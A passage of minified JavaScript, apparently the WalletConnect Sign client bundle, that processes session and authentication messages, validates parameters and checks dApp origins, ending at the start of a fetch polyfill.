this.processRequestsQueue()},this.processRequestsQueue=async()=>{if(this.requestQueue.state===ju.active){this.client.logger.info("Request queue already active, skipping...");return}for(this.client.logger.info(`Request queue starting with ${this.requestQueue.queue.length} requests`);this.requestQueue.queue.length>0;){this.requestQueue.state=ju.active;const t=this.requestQueue.queue.shift();if(t)try{await this.processRequest(t)}catch(i){this.client.logger.warn(i)}}this.requestQueue.state=ju.idle},this.processRequest=async t=>{const{topic:i,payload:n,attestation:s,transportType:o,encryptedId:a}=t,c=n.method;if(!this.shouldIgnorePairingRequest({topic:i,requestMethod:c}))switch(c){case"wc_sessionPropose":return await this.onSessionProposeRequest({topic:i,payload:n,attestation:s,encryptedId:a});case"wc_sessionSettle":return await this.onSessionSettleRequest(i,n);case"wc_sessionUpdate":return await this.onSessionUpdateRequest(i,n);case"wc_sessionExtend":return await this.onSessionExtendRequest(i,n);case"wc_sessionPing":return await this.onSessionPingRequest(i,n);case"wc_sessionDelete":return await this.onSessionDeleteRequest(i,n);case"wc_sessionRequest":return await this.onSessionRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});case"wc_sessionEvent":return await this.onSessionEventRequest(i,n);case"wc_sessionAuthenticate":return await this.onSessionAuthenticateRequest({topic:i,payload:n,attestation:s,encryptedId:a,transportType:o});default:return this.client.logger.info(`Unsupported request method ${c}`)}},this.onRelayEventResponse=async t=>{const{topic:i,payload:n,transportType:s}=t,o=(await this.client.core.history.get(i,n.id)).request.method;switch(o){case"wc_sessionPropose":return this.onSessionProposeResponse(i,n,s);case"wc_sessionSettle":return this.onSessionSettleResponse(i,n);case"wc_sessionUpdate":return this.onSessionUpdateResponse(i,n);case"wc_sessionExtend":return this.onSessionExtendResponse(i,n);case"wc_sessionPing":return this.onSessionPingResponse(i,n);case"wc_sessionRequest":return this.onSessionRequestResponse(i,n);case"wc_sessionAuthenticate":return this.onSessionAuthenticateResponse(i,n);default:return this.client.logger.info(`Unsupported response method ${o}`)}},this.onRelayEventUnknownPayload=t=>{const{topic:i}=t,{message:n}=st("MISSING_OR_INVALID",`Decoded payload on topic ${i} is not identifiable as a JSON-RPC request or a response.`);throw new Error(n)},this.shouldIgnorePairingRequest=t=>{const{topic:i,requestMethod:n}=t,s=this.expectedPairingMethodMap.get(i);return!s||s.includes(n)?!1:!!(s.includes("wc_sessionAuthenticate")&&this.client.events.listenerCount("session_authenticate")>0)},this.onSessionProposeRequest=async t=>{const{topic:i,payload:n,attestation:s,encryptedId:o}=t,{params:a,id:c}=n;try{const l=this.client.core.eventClient.getEvent({topic:i});this.client.events.listenerCount("session_proposal")===0&&(console.warn("No listener for session_proposal event"),l?.setError(Nh.proposal_listener_not_found)),this.isValidConnect(Mn({},n.params));const u=a.expiryTimestamp||ms(Ns.wc_sessionPropose.req.ttl),d=Mn({id:c,pairingTopic:i,expiryTimestamp:u},a);await this.setProposal(c,d);const h=await this.getVerifyContext({attestationId:s,hash:Lh(JSON.stringify(n)),encryptedId:o,metadata:d.proposer.metadata});l?.addTrace(ed.emit_session_proposal),this.client.events.emit("session_proposal",{id:c,params:d,verifyContext:h})}catch(l){await this.sendError({id:c,topic:i,error:l,rpcOpts:Ns.wc_sessionPropose.autoReject}),this.client.logger.error(l)}},this.onSessionProposeResponse=async(t,i,n)=>{const{id:s}=i;if(Gi(i)){const{result:o}=i;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",result:o});const a=this.client.proposal.get(s);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",proposal:a});const c=a.proposer.publicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",selfPublicKey:c});const l=o.responderPublicKey;this.client.logger.trace({type:"method",method:"onSessionProposeResponse",peerPublicKey:l});const u=await this.client.core.crypto.generateSharedKey(c,l);this.client.logger.trace({type:"method",method:"onSessionProposeResponse",sessionTopic:u});const d=await this.client.core.relayer.subscribe(u,{transportType:n});this.client.logger.trace({type:"method",method:"onSessionProposeResponse",subscriptionId:d}),await this.client.core.pairing.activate({topic:t})}else if(wi(i)){await this.client.proposal.delete(s,Hi("USER_DISCONNECTED"));const o=qr("session_connect");if(this.events.listenerCount(o)===0)throw new Error(`emitting ${o} without any listeners, 954`);this.events.emit(qr("session_connect"),{error:i.error})}},this.onSessionSettleRequest=async(t,i)=>{const{id:n,params:s}=i;try{this.isValidSessionSettleRequest(s);const{relay:o,controller:a,expiry:c,namespaces:l,sessionProperties:u,sessionConfig:d}=i.params,h=Fl(Mn(Mn({topic:t,relay:o,expiry:c,namespaces:l,acknowledged:!0,pairingTopic:"",requiredNamespaces:{},optionalNamespaces:{},controller:a.publicKey,self:{publicKey:"",metadata:this.client.metadata},peer:{publicKey:a.publicKey,metadata:a.metadata}},u&&{sessionProperties:u}),d&&{sessionConfig:d}),{transportType:an.relay}),f=qr("session_connect");if(this.events.listenerCount(f)===0)throw new Error(`emitting ${f} without any listeners 997`);this.events.emit(qr("session_connect"),{session:h}),await this.sendResult({id:i.id,topic:t,result:!0,throwOnFailedPublish:!0})}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}},this.onSessionSettleResponse=async(t,i)=>{const{id:n}=i;Gi(i)?(await this.client.session.update(t,{acknowledged:!0}),this.events.emit(qr("session_approve",n),{})):wi(i)&&(await this.client.session.delete(t,Hi("USER_DISCONNECTED")),this.events.emit(qr("session_approve",n),{error:i.error}))},this.onSessionUpdateRequest=async(t,i)=>{const{params:n,id:s}=i;try{const o=`${t}_session_update`,a=vb.get(o);if(a&&this.isRequestOutOfSync(a,s)){this.client.logger.warn(`Discarding out of sync request - ${s}`),this.sendError({id:s,topic:t,error:Hi("INVALID_UPDATE_REQUEST")});return}this.isValidUpdate(Mn({topic:t},n));try{vb.set(o,s),await this.client.session.update(t,{namespaces:n.namespaces}),await this.sendResult({id:s,topic:t,result:!0,throwOnFailedPublish:!0})}catch(c){throw vb.delete(o),c}this.client.events.emit("session_update",{id:s,topic:t,params:n})}catch(o){await this.sendError({id:s,topic:t,error:o}),this.client.logger.error(o)}},this.isRequestOutOfSync=(t,i)=>i.toString().slice(0,-3)<t.toString().slice(0,-3),this.onSessionUpdateResponse=(t,i)=>{const{id:n}=i,s=qr("session_update",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(qr("session_update",n),{}):wi(i)&&this.events.emit(qr("session_update",n),{error:i.error})},this.onSessionExtendRequest=async(t,i)=>{const{id:n}=i;try{this.isValidExtend({topic:t}),await this.setExpiry(t,ms(q2)),await this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_extend",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}},this.onSessionExtendResponse=(t,i)=>{const{id:n}=i,s=qr("session_extend",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(qr("session_extend",n),{}):wi(i)&&this.events.emit(qr("session_extend",n),{error:i.error})},this.onSessionPingRequest=async(t,i)=>{const{id:n}=i;try{this.isValidPing({topic:t}),await this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}},this.onSessionPingResponse=(t,i)=>{const{id:n}=i,s=qr("session_ping",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);setTimeout(()=>{Gi(i)?this.events.emit(qr("session_ping",n),{}):wi(i)&&this.events.emit(qr("session_ping",n),{error:i.error})},500)},this.onSessionDeleteRequest=async(t,i)=>{const{id:n}=i;try{this.isValidDisconnect({topic:t,reason:i.params}),Promise.all([new Promise(s=>{this.client.core.relayer.once(js.publish,async()=>{s(await this.deleteSession({topic:t,id:n}))})}),this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.cleanupPendingSentRequestsForTopic({topic:t,error:Hi("USER_DISCONNECTED")})]).catch(s=>this.client.logger.error(s))}catch(s){this.client.logger.error(s)}},this.onSessionRequest=async t=>{var i,n,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:u}=t,{id:d,params:h}=a;try{await this.isValidRequest(Mn({topic:o},h));const f=this.client.session.get(o),p=await this.getVerifyContext({attestationId:c,hash:Lh(JSON.stringify(jn("wc_sessionRequest",h,d))),encryptedId:l,metadata:f.peer.metadata,transportType:u}),g={id:d,topic:o,params:h,verifyContext:p};await this.setPendingSessionRequest(g),u===an.link_mode&&(i=f.peer.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp((n=f.peer.metadata.redirect)==null?void 0:n.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(g):(this.addSessionRequestToSessionRequestQueue(g),this.processSessionRequestQueue())}catch(f){await this.sendError({id:d,topic:o,error:f}),this.client.logger.error(f)}},this.onSessionRequestResponse=(t,i)=>{const{id:n}=i,s=qr("session_request",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(qr("session_request",n),{result:i.result}):wi(i)&&this.events.emit(qr("session_request",n),{error:i.error})},this.onSessionEventRequest=async(t,i)=>{const{id:n,params:s}=i;try{const o=`${t}_session_event_${s.event.name}`,a=vb.get(o);if(a&&this.isRequestOutOfSync(a,n)){this.client.logger.info(`Discarding out of sync request - ${n}`);return}this.isValidEmit(Mn({topic:t},s)),this.client.events.emit("session_event",{id:n,topic:t,params:s}),vb.set(o,n)}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}},this.onSessionAuthenticateResponse=(t,i)=>{const{id:n}=i;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:t,payload:i}),Gi(i)?this.events.emit(qr("session_request",n),{result:i.result}):wi(i)&&this.events.emit(qr("session_request",n),{error:i.error})},this.onSessionAuthenticateRequest=async t=>{var i;const{topic:n,payload:s,attestation:o,encryptedId:a,transportType:c}=t;try{const{requester:l,authPayload:u,expiryTimestamp:d}=s.params,h=await this.getVerifyContext({attestationId:o,hash:Lh(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),f={requester:l,pairingTopic:n,id:s.id,authPayload:u,verifyContext:h,expiryTimestamp:d};await this.setAuthRequest(s.id,{request:f,pairingTopic:n,transportType:c}),c===an.link_mode&&(i=l.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:n,params:s.params,id:s.id,verifyContext:h})}catch(l){this.client.logger.error(l);const u=s.params.requester.publicKey,d=await this.client.core.crypto.generateKeyPair(),h=this.getAppLinkIfEnabled(s.params.requester.metadata,c),f={type:e0,receiverPublicKey:u,senderPublicKey:d};await this.sendError({id:s.id,topic:n,error:l,encodeOpts:f,rpcOpts:Ns.wc_sessionAuthenticate.autoReject,appLink:h})}},this.addSessionRequestToSessionRequestQueue=t=>{this.sessionRequestQueue.queue.push(t)},this.cleanupAfterResponse=t=>{this.deletePendingSessionRequest(t.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=ju.idle,this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay))},this.cleanupPendingSentRequestsForTopic=({topic:t,error:i})=>{const n=this.client.core.history.pending;n.length>0&&n.filter(s=>s.topic===t&&s.request.method==="wc_sessionRequest").forEach(s=>{const o=s.request.id,a=qr("session_request",o);if(this.events.listenerCount(a)===0)throw new Error(`emitting ${a} without any listeners`);this.events.emit(qr("session_request",s.request.id),{error:i})})},this.processSessionRequestQueue=()=>{if(this.sessionRequestQueue.state===ju.active){this.client.logger.info("session request queue is already active.");return}const t=this.sessionRequestQueue.queue[0];if(!t){this.client.logger.info("session request queue is empty.");return}try{this.sessionRequestQueue.state=ju.active,this.emitSessionRequest(t)}catch(i){this.client.logger.error(i)}},this.emitSessionRequest=t=>{this.client.events.emit("session_request",t)},this.onPairingCreated=t=>{if(t.methods&&this.expectedPairingMethodMap.set(t.topic,t.methods),t.active)return;const i=this.client.proposal.getAll().find(n=>n.pairingTopic===t.topic);i&&this.onSessionProposeRequest({topic:t.topic,payload:jn("wc_sessionPropose",{requiredNamespaces:i.requiredNamespaces,optionalNamespaces:i.optionalNamespaces,relays:i.relays,proposer:i.proposer,sessionProperties:i.sessionProperties},i.id)})},this.isValidConnect=async t=>{if(!ma(t)){const{message:c}=st("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(t)}`);throw new Error(c)}const{pairingTopic:i,requiredNamespaces:n,optionalNamespaces:s,sessionProperties:o,relays:a}=t;if(Vo(i)||await this.isValidPairingTopic(i),!z6e(a)){const{message:c}=st("MISSING_OR_INVALID",`connect() relays: ${a}`);throw new Error(c)}!Vo(n)&&Kv(n)!==0&&this.validateNamespaces(n,"requiredNamespaces"),!Vo(s)&&Kv(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),Vo(o)||this.validateSessionProps(o,"sessionProperties")},this.validateNamespaces=(t,i)=>{const n=q6e(t,"connect()",i);if(n)throw new Error(n.message)},this.isValidApprove=async t=>{if(!ma(t))throw new Error(st("MISSING_OR_INVALID",`approve() params: ${t}`).message);const{id:i,namespaces:n,relayProtocol:s,sessionProperties:o}=t;this.checkRecentlyDeleted(i),await this.isValidProposalId(i);const a=this.client.proposal.get(i),c=WS(n,"approve()");if(c)throw new Error(c.message);const l=gj(a.requiredNamespaces,n,"approve()");if(l)throw new Error(l.message);if(!Zn(s,!0)){const{message:u}=st("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(u)}Vo(o)||this.validateSessionProps(o,"sessionProperties")},this.isValidReject=async t=>{if(!ma(t)){const{message:s}=st("MISSING_OR_INVALID",`reject() params: ${t}`);throw new Error(s)}const{id:i,reason:n}=t;if(this.checkRecentlyDeleted(i),await this.isValidProposalId(i),!H6e(n)){const{message:s}=st("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(n)}`);throw new Error(s)}},this.isValidSessionSettleRequest=t=>{if(!ma(t)){const{message:l}=st("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${t}`);throw new Error(l)}const{relay:i,controller:n,namespaces:s,expiry:o}=t;if(!nX(i)){const{message:l}=st("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=M6e(n,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=WS(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(yf(o)){const{message:l}=st("EXPIRED","onSessionSettleRequest()");throw new Error(l)}},this.isValidUpdate=async t=>{if(!ma(t)){const{message:c}=st("MISSING_OR_INVALID",`update() params: ${t}`);throw new Error(c)}const{topic:i,namespaces:n}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const s=this.client.session.get(i),o=WS(n,"update()");if(o)throw new Error(o.message);const a=gj(s.requiredNamespaces,n,"update()");if(a)throw new Error(a.message)},this.isValidExtend=async t=>{if(!ma(t)){const{message:n}=st("MISSING_OR_INVALID",`extend() params: ${t}`);throw new Error(n)}const{topic:i}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i)},this.isValidRequest=async t=>{if(!ma(t)){const{message:c}=st("MISSING_OR_INVALID",`request() params: ${t}`);throw new Error(c)}const{topic:i,request:n,chainId:s,expiry:o}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const{namespaces:a}=this.client.session.get(i);if(!pj(a,s)){const{message:c}=st("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!V6e(n)){const{message:c}=st("MISSING_OR_INVALID",`request() ${JSON.stringify(n)}`);throw new Error(c)}if(!Z6e(a,s,n.method)){const{message:c}=st("MISSING_OR_INVALID",`request() method: ${n.method}`);throw new Error(c)}if(o&&!X6e(o,YS)){const{message:c}=st("MISSING_OR_INVALID",`request() expiry: ${o}. Expiry must be a number (in seconds) between ${YS.min} and ${YS.max}`);throw new Error(c)}},this.isValidRespond=async t=>{var i;if(!ma(t)){const{message:o}=st("MISSING_OR_INVALID",`respond() params: ${t}`);throw new Error(o)}const{topic:n,response:s}=t;try{await this.isValidSessionTopic(n)}catch(o){throw(i=t?.response)!=null&&i.id&&this.cleanupAfterResponse(t),o}if(!K6e(s)){const{message:o}=st("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(o)}},this.isValidPing=async t=>{if(!ma(t)){const{message:n}=st("MISSING_OR_INVALID",`ping() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)},this.isValidEmit=async t=>{if(!ma(t)){const{message:a}=st("MISSING_OR_INVALID",`emit() params: ${t}`);throw new Error(a)}const{topic:i,event:n,chainId:s}=t;await this.isValidSessionTopic(i);const{namespaces:o}=this.client.session.get(i);if(!pj(o,s)){const{message:a}=st("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!G6e(n)){const{message:a}=st("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}if(!Y6e(o,s,n.name)){const{message:a}=st("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}},this.isValidDisconnect=async t=>{if(!ma(t)){const{message:n}=st("MISSING_OR_INVALID",`disconnect() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)},this.isValidAuthenticate=t=>{const{chains:i,uri:n,domain:s,nonce:o}=t;if(!Array.isArray(i)||i.length===0)throw new Error("chains is required and must be a non-empty array");if(!Zn(n,!1))throw new Error("uri is required parameter");if(!Zn(s,!1))throw new Error("domain is required parameter");if(!Zn(o,!1))throw new Error("nonce is required parameter");if([...new Set(i.map(c=>nw(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=nw(i[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")},this.getVerifyContext=async t=>{const{attestationId:i,hash:n,encryptedId:s,metadata:o,transportType:a}=t,c={verified:{verifyUrl:o.verifyUrl||A5,validation:"UNKNOWN",origin:o.url||""}};try{if(a===an.link_mode){const u=this.getAppLinkIfEnabled(o,a);return c.verified.validation=u&&new URL(u).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:i,hash:n,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c},this.validateSessionProps=(t,i)=>{Object.values(t).forEach(n=>{if(!Zn(n,!1)){const{message:s}=st("MISSING_OR_INVALID",`${i} must be in Record<string, string> format. Received: ${JSON.stringify(n)}`);throw new Error(s)}})},this.getPendingAuthRequest=t=>{const i=this.client.auth.requests.get(t);return typeof i=="object"?i:void 0},this.addToRecentlyDeleted=(t,i)=>{if(this.recentlyDeletedMap.set(t,i),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let n=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(n++>=s)break;this.recentlyDeletedMap.delete(o)}}},this.checkRecentlyDeleted=t=>{const i=this.recentlyDeletedMap.get(t);if(i){const{message:n}=st("MISSING_OR_INVALID",`Record was recently deleted - ${i}: ${t}`);throw new Error(n)}},this.isLinkModeEnabled=(t,i)=>{var n,s,o,a,c,l,u,d,h;return!t||i!==an.link_mode?!1:((s=(n=this.client.metadata)==null?void 0:n.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((u=t?.redirect)==null?void 0:u.universal)!==void 0&&((d=t?.redirect)==null?void 0:d.universal)!==""&&((h=t?.redirect)==null?void 0:h.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(t.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"},this.getAppLinkIfEnabled=(t,i)=>{var n;return this.isLinkModeEnabled(t,i)?(n=t?.redirect)==null?void 0:n.universal:void 0},this.handleLinkModeMessage=({url:t})=>{if(!t||!t.includes("wc_ev")||!t.includes("topic"))return;const i=MU(t,"topic")||"",n=decodeURIComponent(MU(t,"wc_ev")||""),s=this.client.session.keys.includes(i);s&&this.client.session.update(i,{transportType:an.link_mode}),this.client.core.dispatchEnvelope({topic:i,message:n,sessionExists:s})},this.registerLinkModeListeners=async()=>{var t;if(lR()||Sp()&&(t=this.client.metadata.redirect)!=null&&t.linkMode){const i=global==null?void 0:global.Linking;if(typeof i<"u"){i.addEventListener("url",this.handleLinkModeMessage,this.client.name);const n=await i.getInitialURL();n&&setTimeout(()=>{this.handleLinkModeMessage({url:n})},50)}}}}isInitialized(){if(!this.initialized){const{message:e}=st("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(js.message,e=>{!this.initialized||this.relayMessageCache.length>0?this.relayMessageCache.push(e):this.onRelayMessage(e)})}async onRelayMessage(e){const{topic:t,message:i,attestation:n,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(l9)?this.client.auth.authKeys.get(l9):{publicKey:void 0},a=await this.client.core.crypto.decode(t,i,{receiverPublicKey:o,encoding:s===an.link_mode?bb:Rf});try{N0(a)?(this.client.core.history.set(t,a),this.onRelayEventRequest({topic:t,payload:a,attestation:n,transportType:s,encryptedId:Lh(i)})):Jd(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:t,payload:a,transportType:s}),this.client.core.history.delete(t,a.id)):this.onRelayEventUnknownPayload({topic:t,payload:a,transportType:s})}catch(c){this.client.logger.error(c)}}registerExpirerEvents(){this.client.core.expirer.on(Kc.expired,async e=>{const{topic:t,id:i}=$Q(e.target);if(i&&this.client.pendingRequest.keys.includes(i))return await this.deletePendingSessionRequest(i,st("EXPIRED"),!0);if(i&&this.client.auth.requests.keys.includes(i))return await this.deletePendingAuthRequest(i,st("EXPIRED"),!0);t?this.client.session.keys.includes(t)&&(await this.deleteSession({topic:t,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:t})):i&&(await this.deleteProposal(i,!0),this.client.events.emit("proposal_expire",{id:i}))})}registerPairingEvents(){this.client.core.pairing.events.on(c1.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(c1.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!Zn(e,!1)){const{message:t}=st("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(t)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:t}=st("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(t)}if(yf(this.client.core.pairing.pairings.get(e).expiry)){const{message:t}=st("EXPIRED",`pairing topic: ${e}`);throw new Error(t)}}async isValidSessionTopic(e){if(!Zn(e,!1)){const{message:t}=st("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(t)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:t}=st("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(t)}if(yf(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:t}=st("EXPIRED",`session topic: ${e}`);throw new Error(t)}if(!this.client.core.crypto.keychain.has(e)){const{message:t}=st("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(t)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(Zn(e,!1)){const{message:t}=st("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(t)}else{const{message:t}=st("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(t)}}async isValidProposalId(e){if(!W6e(e)){const{message:t}=st("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(t)}if(!this.client.proposal.keys.includes(e)){const{message:t}=st("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(t)}if(yf(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:t}=st("EXPIRED",`proposal id: ${e}`);throw new Error(t)}}},Rxe=class extends s2{constructor(e,t){super(e,t,wxe,yR),this.core=e,this.logger=t}},Oxe=class extends s2{constructor(e,t){super(e,t,bxe,yR),this.core=e,this.logger=t}},Bxe=class extends s2{constructor(e,t){super(e,t,yxe,yR,i=>i.id),this.core=e,this.logger=t}},Mxe=class extends s2{constructor(e,t){super(e,t,_xe,uC,()=>l9),this.core=e,this.logger=t}},Dxe=class extends s2{constructor(e,t){super(e,t,Sxe,uC),this.core=e,this.logger=t}},Lxe=class extends s2{constructor(e,t){super(e,t,Axe,uC,i=>i.id),this.core=e,this.logger=t}},Uxe=class{constructor(e,t){this.core=e,this.logger=t,this.authKeys=new Mxe(this.core,this.logger),this.pairingTopics=new Dxe(this.core,this.logger),this.requests=new Lxe(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}},jxe=class NX extends jwe{constructor(e){super(e),this.protocol=AX,this.version=IX,this.name=ZS.name,this.events=new en.EventEmitter,this.on=(i,n)=>this.events.on(i,n),this.once=(i,n)=>this.events.once(i,n),this.off=(i,n)=>this.events.off(i,n),this.removeListener=(i,n)=>this.events.removeListener(i,n),this.removeAllListeners=i=>this.events.removeAllListeners(i),this.connect=async i=>{try{return await this.engine.connect(i)}catch(n){throw this.logger.error(n.message),n}},this.pair=async i=>{try{return await this.engine.pair(i)}catch(n){throw this.logger.error(n.message),n}},this.approve=async i=>{try{return await this.engine.approve(i)}catch(n){throw this.logger.error(n.message),n}},this.reject=async i=>{try{return await this.engine.reject(i)}catch(n){throw this.logger.error(n.message),n}},this.update=async i=>{try{return await this.engine.update(i)}catch(n){throw this.logger.error(n.message),n}},this.extend=async i=>{try{return await this.engine.extend(i)}catch(n){throw this.logger.error(n.message),n}},this.request=async i=>{try{return await this.engine.request(i)}catch(n){throw this.logger.error(n.message),n}},this.respond=async i=>{try{return await this.engine.respond(i)}catch(n){throw this.logger.error(n.message),n}},this.ping=async i=>{try{return await this.engine.ping(i)}catch(n){throw this.logger.error(n.message),n}},this.emit=async i=>{try{return await this.engine.emit(i)}catch(n){throw this.logger.error(n.message),n}},this.disconnect=async i=>{try{return await this.engine.disconnect(i)}catch(n){throw this.logger.error(n.message),n}},this.find=i=>{try{return this.engine.find(i)}catch(n){throw this.logger.error(n.message),n}},this.getPendingSessionRequests=()=>{try{return this.engine.getPendingSessionRequests()}catch(i){throw this.logger.error(i.message),i}},this.authenticate=async(i,n)=>{try{return await this.engine.authenticate(i,n)}catch(s){throw this.logger.error(s.message),s}},this.formatAuthMessage=i=>{try{return this.engine.formatAuthMessage(i)}catch(n){throw this.logger.error(n.message),n}},this.approveSessionAuthenticate=async i=>{try{return await this.engine.approveSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}},this.rejectSessionAuthenticate=async i=>{try{return await this.engine.rejectSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}},this.name=e?.name||ZS.name,this.metadata=e?.metadata||IQ(),this.signConfig=e?.signConfig;const t=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||ZS.logger}));this.core=e?.core||new mxe(e),this.logger=gr(t,this.name),this.session=new Oxe(this.core,this.logger),this.proposal=new Rxe(this.core,this.logger),this.pendingRequest=new Bxe(this.core,this.logger),this.engine=new $xe(this),this.auth=new Uxe(this.core,this.logger)}static async init(e){const t=new NX(e);return await t.initialize(),t}get context(){return Or(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success"),setTimeout(()=>{this.engine.processRelayMessageCache()},fe.toMiliseconds(fe.ONE_SECOND))}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};var X6={exports:{}},rF;function Fxe(){return rF||(rF=1,function(r,e){var t=typeof globalThis<"u"&&globalThis||typeof self<"u"&&self||typeof Po<"u"&&Po,i=function(){function s(){this.fetch=!1,this.DOMException=t.DOMException}return s.prototype=t,new s}();(function(s){(function(o){var a=typeof s<"u"&&s||typeof self<"u"&&self||typeof Po<"u"&&Po||{},c={searchParams:"URLSearchParams"in a,iterable:"Symbol"in a&&"iterator"in Symbol,blob:"FileReader"in a&&"Blob"in a&&function(){try{return new Blob,!0}catch{return!1}}(),formData:"FormData"in a,arrayBuffer:"ArrayBuffer"in a};function l(v){return v&&DataView.prototype.isPrototypeOf(v)}if(c.arrayBuffer)var u=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],d=ArrayBuffer.isView||function(v){return v&&u.indexOf(Object.prototype.toString.call(v))>-1};function h(v){if(typeof v!="string"&&(v=String(v)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(v)||v==="")throw new TypeError('Invalid character in header field name: "'+v+'"');return v.toLowerCase()}function f(v){return typeof v!="string"&&(v=String(v)),v}function p(v){var _={next:function(){var O=v.shift();return{done:O===void 